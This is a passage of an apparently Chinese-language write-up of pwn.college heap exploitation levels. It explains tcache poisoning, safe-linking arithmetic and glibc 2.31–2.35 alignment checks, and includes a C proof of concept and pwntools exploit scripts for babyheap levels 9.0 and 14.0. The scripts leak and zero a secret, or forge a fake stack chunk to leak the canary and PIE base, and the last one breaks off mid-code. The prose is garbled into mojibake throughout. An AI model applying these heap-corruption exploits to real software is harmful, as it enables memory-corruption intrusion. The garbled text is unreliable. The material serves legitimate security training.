<p>ç°åœ¨æˆ‘ä»¬çŸ¥é“çš„æ˜¯<code>fake_chunk_addr</code></p>
<p>è¿˜éœ€è¦çŸ¥é“ä¸€ä¸ª<code>tcache-&gt;entries[tc_idx]</code></p>
<p>æ¥ä¸‹æ¥å†é‡Šæ”¾ä¸€ä¸ªå †å—<code>chunk0</code>è¿›å…¥<code>tcache</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chunk0.next = PROTECT_PTR(chunk0_addr,tcache-&gt;entries[tc_idx])</span><br><span class="line">			= ( chunk0_addr &gt;&gt; 12 ) ^ [( fake_chunk_addr &gt;&gt; 12 ) ^ fake_chunk.next]</span><br></pre></td></tr></table></figure>

<p>å› æ­¤æœ€ç»ˆå¾—åˆ°</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fake_chunk.next = chunk0.next ^ (chunk0 &gt;&gt; 12) ^ (fake_chunk_addr &gt;&gt; 12)</span><br></pre></td></tr></table></figure>



<p>å†™ä¸ª<code>poc</code>æ„æ€æ„æ€</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="type">size_t</span> flag_low;</span><br><span class="line">    <span class="type">size_t</span> flag_high;</span><br><span class="line">&#125;Secret;</span><br><span class="line"></span><br><span class="line">Secret secret=&#123;</span><br><span class="line">    .flag_low = <span class="number">0x0011223344556677</span>,</span><br><span class="line">    .flag_high = <span class="number">0x8899aabbccddeeff</span></span><br><span class="line">&#125;; </span><br><span class="line"><span class="type">void</span> <span class="title function_">print_secret</span><span class="params">(Secret *s)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;secret @ %p\n&quot;</span>, s);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;secret.flag_low = %p\n&quot;</span>, s-&gt;flag_low);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;secret.flag_high = %p\n&quot;</span>, s-&gt;flag_high);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> * chunk1;</span><br><span class="line">    <span class="type">size_t</span> * chunk2;</span><br><span class="line">    <span class="type">size_t</span> * chunk0;</span><br><span class="line">    <span class="type">size_t</span> * victim;</span><br><span class="line">    <span class="type">size_t</span> chunk0_next;</span><br><span class="line">    <span class="type">size_t</span> chunk1_next;</span><br><span class="line">    <span class="type">size_t</span> chunk2_next;</span><br><span class="line">    <span class="type">size_t</span> ep;</span><br><span class="line">    <span class="type">size_t</span> leak;</span><br><span class="line"></span><br><span class="line">    chunk0 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    chunk1 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    chunk2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    <span class="built_in">free</span>(chunk2);</span><br><span class="line">    chunk1_next = chunk1[<span class="number">0</span>];         <span class="comment">//chunk1_next = page number</span></span><br><span class="line">    chunk2_next = chunk2[<span class="number">0</span>];</span><br><span class="line">    chunk2[<span class="number">0</span>] = chunk1_next ^ (<span class="type">size_t</span>)(&amp;secret);</span><br><span class="line"></span><br><span class="line">    chunk2 = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    victim = <span class="built_in">malloc</span>(<span class="number">0x10</span>);          <span class="comment">// remove secret.flag_high</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(chunk0);</span><br><span class="line">    chunk0_next = chunk0[<span class="number">0</span>];</span><br><span class="line">    ep = chunk1_next ^ chunk0_next;         <span class="comment">//tcache entry</span></span><br><span class="line">    leak = ep ^ ((<span class="type">size_t</span>)(&amp;secret)&gt;&gt;<span class="number">12</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;leak = %p\n&quot;</span>, leak);</span><br><span class="line">    print_secret(&amp;secret);</span><br><span class="line">    assert(leak == secret.flag_low);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿Destroyer)-[/mnt/c/Users/xidian/Desktop/pwncollege/heap/test]</span><br><span class="line">â””â”€# gcc safe_metadata.c -o safe_metadata -g -w</span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootã‰¿Destroyer)-[/mnt/c/Users/xidian/Desktop/pwncollege/heap/test]</span><br><span class="line">â””â”€# ./safe_metadata</span><br><span class="line">leak = 0x11223344556677</span><br><span class="line">secret @ 0x5599e7a02030</span><br><span class="line">secret.flag_low = 0x11223344556677</span><br><span class="line">secret.flag_high = (nil)</span><br></pre></td></tr></table></figure>



<p>æ³¨æ„glibc2.35ä¹‹åå †å—çš„å¯¹é½è¦æ±‚, å †å—çš„åœ°å€å¿…é¡»æ˜¯0x10å¯¹é½çš„</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get_n</span> <span class="params">(<span class="type">size_t</span> tc_idx, tcache_entry **ep)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e;</span><br><span class="line">  <span class="keyword">if</span> (ep == &amp;(tcache-&gt;entries[tc_idx]))</span><br><span class="line">    e = *ep;</span><br><span class="line">	...</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);</span><br><span class="line">    </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> aligned_OK(m)  (((unsigned long)(m) &amp; MALLOC_ALIGN_MASK) == 0)</span></span><br><span class="line">	<span class="comment">//MALLOC_ALIGN_MASK = 0xf</span></span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯glibc2.31åŠä¹‹å‰æ˜¯å¯ä»¥å¯¹é½åˆ°0x8çš„</p>
<h3 id="glibc-2-35"><a href="#glibc-2-35" class="headerlink" title="glibc-2.35"></a>glibc-2.35</h3><p>ubuntu22.04ä¸Šä½¿ç”¨glibc-2.35,å…¶æ•°æ®ç»“æ„ä¸ç®—æ³•åŸºæœ¬ä¸Šå’Œglibc2.38ç›¸</p>
<h2 id="pwn-college"><a href="#pwn-college" class="headerlink" title="pwn.college"></a>pwn.college</h2><table>
<thead>
<tr>
<th>ubuntuå‘è¡Œç‰ˆ</th>
<th>glibcç‰ˆæœ¬</th>
<th>è°ƒè¯•å·¥å…·</th>
</tr>
</thead>
<tbody><tr>
<td>16.04</td>
<td>2.23</td>
<td>gef</td>
</tr>
<tr>
<td>18.04</td>
<td>2.27</td>
<td>pwndbg for ubuntu18.04</td>
</tr>
<tr>
<td>20.04</td>
<td>2.31</td>
<td>pwndbg for ubuntu20.04</td>
</tr>
<tr>
<td>22.04</td>
<td>2.35</td>
<td>pwndbg</td>
</tr>
</tbody></table>
<blockquote>
<p>pwndbg for ubuntu18.04çš„å®‰è£…æ–¹æ³•</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/pwndbg/pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">git checkout 71c4e1d</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure>

<p>pwndbg for ubuntu20.04çš„å®‰è£…æ–¹æ³•</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/pwndbg/pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">git checkout 26ba400</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="level1-UAF"><a href="#level1-UAF" class="headerlink" title="level1 - UAF"></a>level1 - UAF</h3><h3 id="level2"><a href="#level2" class="headerlink" title="level2 -"></a>level2 -</h3><h3 id="level9-0"><a href="#level9-0" class="headerlink" title="level9.0"></a>level9.0</h3><p><code>secret </code>ä½äº <code>0x427C72</code></p>
<p>ç„¶è€Œ<code>malloc</code>æ£€æŸ¥åœ°å€å¿…é¡»åœ¨<code>0x430000</code>ä¹‹ä¸Š</p>
<p>å¦‚æ­¤ä¸€æ¥, <strong>é€šè¿‡<code>UAF tcache poisoning</code>æŠŠ<code>0x427C72</code>ä½œä¸ºå‡å †å—æŒ‚åˆ°<code>tcache</code>ä¸­, ç„¶å<code>malloc</code>æ‹¿å‡ºæ¥æ‰“å°å…¶å†…å®¹</strong>çš„æ€è·¯å°±å¤±æ•ˆäº†, å› ä¸º<code>malloc </code>ä¸è®©æˆ‘ä»¬æ‹¿å‡ºè¿™ä¸ªå‡å †å—æ¥</p>
<p>è™½ç„¶æˆ‘ä»¬æ‹¿ä¸å‡ºå‡å †å—æ¥,ä½†æ˜¯æŠ•æ¯’ä¼šä¼ æŸ“ç»™å…ƒæ•°æ®</p>
<p><strong>å…·ä½“æ¥è¯´:</strong></p>
<p>1.é€šè¿‡<code>UAF</code>å¯¹<code>tcache</code>ä¸­çš„çœŸå †å—æŠ•æ¯’,ä½¿å¾— <strong>å‡å †å—@0x427C72</strong> è¿›å…¥<code>tcache</code></p>
<p>2.<code>malloc </code>æ‹¿å‡ºçœŸå †å—</p>
<p>3.<code>malloc </code>æ‹¿å‡ºå‡å †å—, </p>
<p>æ­¤æ—¶å‡å †å—çš„<code>next</code>å€¼,å°±æ˜¯<code>secret[0-7]</code></p>
<p>æ­¤æ—¶å‡å †å—çš„<code>key</code>å€¼,å°±æ˜¯<code>secret[8-15]</code></p>
<p><code>tcache</code>å…ƒæ•°æ®ä¼šç»§æ‰¿ <strong>å‡å †å—.next</strong>,</p>
<p>å¹¶ä¸”å‡å †å—åœ¨è¢«é‡æ–°åˆ†é…æ—¶,<code>key</code>å€¼ä¼šè¢«ç½®é›¶,ä¹Ÿå°±æ˜¯è¯´<code>secret[8-15] = 0</code></p>
<p>4.é‡å¤ä¸Šè¿°æ­¥éª¤,ä½†æ˜¯è¿™æ¬¡<strong>å‡å †å—@0x427C72 - 8</strong></p>
<p>å¦‚æ­¤<code>secret[0-7]</code>ä¹Ÿä¼šè¢«ç½®0</p>
<p>å¦‚æ­¤ä¸€æ¥,æˆ‘ä»¬æ ¹æœ¬ä¸éœ€è¦çŸ¥é“<code>secret</code>æ˜¯å¤šå°‘,ç›´æ¥æ”¾é›¶è›‹</p>
<blockquote>
<p>glibc2.31ä¸­,tcacheçš„å †å—ä¸ä¼šæœ‰å¯¹é½è¦æ±‚</p>
<p>åŒæ ·çš„æ€è·¯åœ¨glibc2.35ä¸Šå°±æ›´åŠ å›°éš¾äº†,ä¸€ä¸ªæ˜¯æœ‰safe-linking ,äºŒä¸ªæ˜¯tcacheå †å—å¿…é¡»å¯¹é½åˆ°0x10</p>
<p>glibc2.35ä¸­å¯ä»¥æ³„éœ²ä½8å­—èŠ‚,å½’é›¶é«˜8å­—èŠ‚</p>
</blockquote>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./babyheap_level9.0&#x27;</span>)</span><br><span class="line"><span class="comment"># p=process(&#x27;/challenge/babyheap_level9.0&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">malloc</span>(<span class="params">index,size</span>):</span><br><span class="line">    index=<span class="built_in">str</span>(index).encode()</span><br><span class="line">    size=<span class="built_in">str</span>(size).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;malloc&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    p.sendline(size)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    index=<span class="built_in">str</span>(index).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;free&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">puts</span>(<span class="params">index,size = <span class="number">0</span></span>):</span><br><span class="line">    index=<span class="built_in">str</span>(index).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;puts&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Data: &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> size == <span class="number">0</span>:</span><br><span class="line">        data = p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        data = p.recv(size)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scanf</span>(<span class="params">index,content</span>):</span><br><span class="line">    index=<span class="built_in">str</span>(index).encode()</span><br><span class="line">    p.sendline(<span class="string">b&#x27;scanf&#x27;</span>)</span><br><span class="line">    p.sendline(index)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_flag</span>(<span class="params">secret</span>):</span><br><span class="line">    p.sendline(<span class="string">b&#x27;send_flag&#x27;</span>)</span><br><span class="line">    p.sendline(secret)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;You win! Here is your flag:\n&#x27;</span>)</span><br><span class="line">    flag = p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="built_in">print</span>(flag.decode())</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">addr</span>):</span><br><span class="line">    malloc(<span class="number">5</span>,<span class="number">0x10</span>)</span><br><span class="line">    malloc(<span class="number">4</span>,<span class="number">0x10</span>)</span><br><span class="line">    malloc(<span class="number">0</span>,<span class="number">0x10</span>)</span><br><span class="line">    free(<span class="number">4</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    scanf(<span class="number">0</span>,p64(addr))</span><br><span class="line">    malloc(<span class="number">0</span>,<span class="number">0x10</span>)</span><br><span class="line">    malloc(<span class="number">1</span>,<span class="number">0x10</span>)          <span class="comment"># get fake_chunk out of tcache</span></span><br><span class="line">    free(<span class="number">5</span>)</span><br><span class="line">    data = puts(<span class="number">5</span>,<span class="number">8</span>)</span><br><span class="line">    malloc(<span class="number">5</span>,<span class="number">0x10</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line">    </span><br><span class="line">secret_addr = <span class="number">0x427C72</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># secret_high = leak(secret_addr+8)       # no need to know secret_high which will be overwritten to zero by the next step</span></span><br><span class="line">leak(secret_addr)          <span class="comment"># secret_high will be regarded as tcache entry&#x27;s secret and will be set to zero when leave tcache</span></span><br><span class="line">leak(secret_addr - <span class="number">8</span>)      <span class="comment"># secret_low will be regarded as tcache entry&#x27;s secret and will be set to zero when leave tcache</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#secret was reset to 0 after 2 leak</span></span><br><span class="line">secret = p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">send_flag(secret)</span><br></pre></td></tr></table></figure>



<h3 id="level14-0"><a href="#level14-0" class="headerlink" title="level14.0"></a>level14.0</h3><p>ç¨‹åºä¸­æœ‰ä¸€ä¸ª<code>win</code>å‡½æ•°ï¼Œå¯ä»¥<code>ret2text</code></p>
<p>ä½†æ˜¯ç¨‹åºå¼€å¯äº†<code>pie</code>ä¿æŠ¤ï¼Œå› æ­¤éœ€è¦å…ˆæ³„éœ²<code>pie base</code></p>
<p>å…è®¸å †æ ˆä¸Šæº¢å‡ºæ„é€ å‡å †å—ï¼Œå¹¶<code>free</code>è¿›å…¥<code>tcache</code>, </p>
<p>ç”±äºæ ˆä¸Šæœ‰<code>canary</code>å¹¶ä¸”æº¢å‡ºé•¿åº¦æœ‰é™, å› æ­¤éœ€è¦åˆ©ç”¨å‡å †å—è¿›è¡Œæ³„éœ²æˆ–è€…ç¯¡æ”¹è¿”å›åœ°å€</p>
<blockquote>
<p>bufferè§†è§’:</p>
<table>
<thead>
<tr>
<th></th>
<th>offset</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td>ä½</td>
</tr>
<tr>
<td><strong>buffer</strong></td>
<td><strong>0</strong></td>
<td></td>
</tr>
<tr>
<td>prev_size</td>
<td>+ 0x30</td>
<td></td>
</tr>
<tr>
<td>size</td>
<td>+ 0x38</td>
<td></td>
</tr>
<tr>
<td><strong>chunk_mem</strong></td>
<td><strong>+ 0x40</strong></td>
<td></td>
</tr>
<tr>
<td>â€¦</td>
<td></td>
<td></td>
</tr>
<tr>
<td>&#x3D;&#x3D;buffer_end&#x3D;&#x3D;</td>
<td>+ 0x7f</td>
<td></td>
</tr>
<tr>
<td>â€¦</td>
<td></td>
<td></td>
</tr>
<tr>
<td>main_retaddr</td>
<td>+ 0x98</td>
<td></td>
</tr>
<tr>
<td>â€¦</td>
<td></td>
<td></td>
</tr>
<tr>
<td>__libc_start_main_retaddr</td>
<td>+ 0x168</td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td>é«˜</td>
</tr>
</tbody></table>
<p>å †å—è§†è§’:</p>
<table>
<thead>
<tr>
<th>prev_size</th>
<th>- 0x10</th>
<th>ä½</th>
</tr>
</thead>
<tbody><tr>
<td>size</td>
<td>- 0x8</td>
<td></td>
</tr>
<tr>
<td><strong>chunkmem</strong></td>
<td><strong>0</strong></td>
<td></td>
</tr>
<tr>
<td>â€¦</td>
<td></td>
<td></td>
</tr>
<tr>
<td>canary</td>
<td>+ 0x48</td>
<td></td>
</tr>
<tr>
<td>â€¦</td>
<td></td>
<td></td>
</tr>
<tr>
<td>main_retaddr</td>
<td>+ 0x58</td>
<td></td>
</tr>
<tr>
<td>â€¦</td>
<td></td>
<td></td>
</tr>
<tr>
<td>__libc_start_main_retaddr</td>
<td>+ 0x128</td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td>é«˜</td>
</tr>
</tbody></table>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">usable_size = 0x130</span><br><span class="line">chunk_size = (0x130+0x10) | 1 = 0x141</span><br></pre></td></tr></table></figure>



<p>æ­¤æ—¶<code>chunkmem + 0x48</code>å¤„æ˜¯<code>main</code>æ ˆå¸§ä¸­çš„<code>canary</code>æ‰€åœ¨åœ°</p>
<p>æ­¤æ—¶<code>chunkmem + 0x58</code>å¤„æ˜¯<code>main</code>å‡½æ•°çš„è¿”å›åœ°å€, æ­£å¸¸æƒ…å†µä¸‹æ˜¯<code>__libc_start_main+243 @ glibc</code>å¤„</p>
<p>æ­¤æ—¶<code>chunkmem + 0x128</code>å¤„æ˜¯<code>__libc_start_main</code>å‡½æ•°è¿”å›åœ°å€, æ­£å¸¸æƒ…å†µä¸‹æ˜¯<code>_start+46 @ babylevel14.0</code>å¤„</p>
<p>æ­£å¥½ä¸¤ä¸ªåœ°å€ä¸€ä¸ªå¯ä»¥æ³„éœ²<code>libc_base</code>, ä¸€ä¸ªå¯ä»¥æ³„éœ²<code>pie_base</code>, å½“ç„¶, æœ¬é¢˜ä¸­åªéœ€è¦æ³„éœ²<code>pie_base</code></p>
<p>æ¥ä¸‹æ¥å°±å¯ä»¥åœ¨<code>chunkmem</code>ä¸Šæº¢å‡º</p>
<p>ç»¼ä¸Š</p>
<p>1.åœ¨å †æ ˆä¸Šæ„é€ å‡å †å—, å¤§å°æ¶µç›–ä¸¤ä¸ªè¿”å›åœ°å€</p>
<p>2.ä¸‹ä¸€æ¬¡<code>malloc</code>æ‹¿åˆ°å‡å †å—, æ‰“å°æ³„éœ²<code>canary</code>å’Œä¸¤ä¸ªè¿”å›åœ°å€, è®¡ç®—å¾—åˆ°<code>pie_base</code></p>
<p>3.åœ¨å‡å †å—ä¸Šæº¢å‡º</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment"># p = process(&quot;./babyheap_level14.0&quot;)</span></span><br><span class="line">p = process(<span class="string">&quot;/challenge/babyheap_level14.0&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">malloc</span>(<span class="params">index,size</span>):</span><br><span class="line">  index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">  size = <span class="built_in">str</span>(size).encode()</span><br><span class="line">  p.sendline(<span class="string">b&#x27;malloc&#x27;</span>)</span><br><span class="line">  p.sendline(index)</span><br><span class="line">  p.sendline(size)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">  index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">  p.sendline(<span class="string">b&#x27;free&#x27;</span>)</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">echo</span>(<span class="params">index,offset,n = <span class="number">6</span></span>):</span><br><span class="line">  index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">  offset = <span class="built_in">str</span>(offset).encode()</span><br><span class="line">  p.sendline(<span class="string">b&#x27;echo&#x27;</span>)</span><br><span class="line">  p.sendline(index)</span><br><span class="line">  p.sendline(offset)</span><br><span class="line">  p.recvuntil(<span class="string">b&#x27;Data: &#x27;</span>)</span><br><span class="line">  data = p.recv(n)</span><br><span class="line">  data = data[::-<span class="number">1</span>]</span><br><span class="line">  data = <span class="built_in">int</span>.from_bytes(data,byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">  </span><br><span class="line">  <span class="comment"># data = int(data,16)</span></span><br><span class="line">  <span class="keyword">return</span> data</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">scanf</span>(<span class="params">index,content</span>):</span><br><span class="line">  index = <span class="built_in">str</span>(index).encode()</span><br><span class="line">  p.sendline(<span class="string">b&#x27;scanf&#x27;</span>)</span><br><span class="line">  p.sendline(index)</span><br><span class="line">  p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stack_free</span>():</span><br><span class="line">  p.sendline(<span class="string">b&#x27;stack_free&#x27;</span>)</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">stack_scanf</span>(<span class="params">content</span>):</span><br><span class="line">  p.sendline(<span class="string">b&#x27;stack_scanf&#x27;</span>)</span><br><span class="line">  p.sendline(content)</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#1.å †æ ˆæº¢å‡ºæ„é€ å‡å †å—å¹¶é‡Šæ”¾ï¼Œä½¿ä¹‹è¿›å…¥tcache</span></span><br><span class="line"></span><br><span class="line">usable_size = <span class="number">0x130</span></span><br><span class="line">chunk_size = ( usable_size + <span class="number">0x10</span> ) | <span class="number">1</span>     <span class="comment">#1 means previous chunk is in use</span></span><br><span class="line"></span><br><span class="line">buffer = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(chunk_size)</span><br><span class="line">stack_scanf(buffer)</span><br><span class="line">stack_free()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#2.é€šè¿‡å‡å †å—æ³„éœ²è¿”å›åœ°å€ä¸Šçš„å€¼, æ³„éœ²canary</span></span><br><span class="line">canary_offset = <span class="number">0x48</span></span><br><span class="line">main_retaddr_offset = <span class="number">0x58</span></span><br><span class="line">__libc_start_main_retaddr_offset = <span class="number">0x128</span></span><br><span class="line">malloc(<span class="number">1</span>,usable_size)</span><br><span class="line">main_retaddr_value = echo(<span 